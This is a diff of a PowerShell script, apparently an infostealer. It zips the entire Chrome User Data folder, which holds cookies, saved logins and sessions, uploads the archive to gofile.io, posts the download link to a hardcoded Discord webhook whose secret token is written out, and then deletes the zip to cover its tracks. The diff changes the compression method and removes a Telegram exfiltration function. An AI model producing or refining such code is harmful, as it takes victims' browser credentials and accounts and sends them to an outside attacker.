@@ -2,29 +2,6 @@
 # $chatID = "chat_id"
 $webhook = "https://discord.com/api/webhooks/1358791393405047081/Uz8PRcFd4de_7tDePzmRsTlGKo76zMkjehmo0WvYw-REPkgNXexXGBK2b78RRfOmWU3N"
 
-# Function for sending messages through Telegram Bot
-function Send-TelegramMessage {
-    param (
-        [string]$message
-    )
-
-    if ($botToken -and $chatID) {
-        $uri = "https://api.telegram.org/bot$botToken/sendMessage"
-        $body = @{
-            chat_id = $chatID
-            text = $message
-        }
-
-        try {
-            Invoke-RestMethod -Uri $uri -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
-        } catch {
-            Write-Host "Failed to send message to Telegram: $_"
-        }
-    } else {
-        Send-DiscordMessage -message $message
-    }
-}
-
 # Function for sending messages through Discord Webhook
 function Send-DiscordMessage {
     param (
@@ -96,14 +73,25 @@ if (-not (Test-Path $chromePath)) {
 # Log the existence of chrome path
 Write-Host "Chrome path found: $chromePath"
 
-# Create a zip of the Chrome User Data using the built-in Compress-Archive cmdlet
+# Create a zip of the Chrome User Data using .NET compression (alternative method)
 $outputZip = "$env:TEMP\chrome_data.zip"
 try {
-    Write-Host "Attempting to compress data at: $chromePath"
-    Compress-Archive -Path $chromePath -DestinationPath $outputZip
+    $zipFile = [System.IO.Compression.ZipFile]::Open($outputZip, [System.IO.Compression.ZipArchiveMode]::Create)
+
+    # Add files from Chrome User Data directory to zip
+    Get-ChildItem -Path $chromePath -Recurse | ForEach-Object {
+        $file = $_
+        if ($file.PSIsContainer) {
+            $zipFile.CreateEntryDirectory($file.FullName.Substring($chromePath.Length + 1)) # Create the directory structure in the zip
+        } else {
+            $zipFile.CreateEntryFromFile($file.FullName, $file.FullName.Substring($chromePath.Length + 1)) # Add files to zip
+        }
+    }
+    $zipFile.Dispose()
+
     Write-Host "Compression successful, file saved at: $outputZip"
 } catch {
-    Send-DiscordMessage -message "Error creating zip file with Compress-Archive: $_"
+    Send-DiscordMessage -message "Error creating zip file with .NET: $_"
     exit
 }
 
@@ -114,4 +102,8 @@ $link = Upload-FileAndGetLink -filePath $outputZip
 if ($link -ne $null) {
     Send-DiscordMessage -message "Download link: $link"
 } else {
-    Send-DiscordMessage -message "
+    Send-DiscordMessage -message "Failed to upload file to gofile.io"
+}
+
+# Remove the zip file after uploading
+Remove-Item $outputZip
